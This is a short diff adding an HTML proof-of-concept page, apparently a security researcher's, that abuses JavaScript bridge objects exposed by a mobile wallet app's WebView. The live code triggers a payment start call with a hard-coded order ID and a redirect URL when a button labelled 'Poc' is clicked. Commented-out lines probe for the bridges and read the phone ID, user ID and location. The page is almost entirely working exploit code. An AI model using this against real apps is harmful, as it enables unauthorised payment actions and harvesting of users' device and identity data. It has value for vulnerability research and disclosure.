@@ -1,0 +1,27 @@
+<script>
+function poc()
+{
+    //document.getElementById("output").value = hiWalletQueryUserDataAPI.getPhoneType() + " " + hiWalletQueryUserDataAPI.getPhoneID() + " " + hiWalletQueryUserDataAPI.getUserID() + " " + actionUtil.getLocation();
+    //alert("1235");
+    //if (typeof hiWalletQueryUserDataAPI != "undefined") {
+    //    alert("hiWalletQueryUserDataAPI");
+    //} else if (typeof hiWalletShareAPI != "undefined") {
+    //    alert("hiWalletShareAPI");
+    //} else if (typeof hiWalletIsNfcEnableAPI != "undefined") {
+    //    alert("hiWalletIsNfcEnableAPI");
+    //} else if (typeof actionUtil != "undefined") {
+    //    alert("actionUtil");
+    //} else if (typeof hiWalletCheckStatusPayAPI != "undefined") {
+    //    alert("hiWalletCheckStatusPayAPI");
+    //} else if (typeof document != "undefined") {
+    //    alert("document");
+    //}
+    hiWalletCheckStatusPayAPI.startPay("596076855764482470506", "https://www.baidu.com/");
+}
+</script>
+
+<textarea rows="8" cols="40" id="output"></textarea>
+<br>
+<button onclick="poc()" >Poc</button>
+<br>
+<a href="https://poc.cub4r.co/">Back</a>
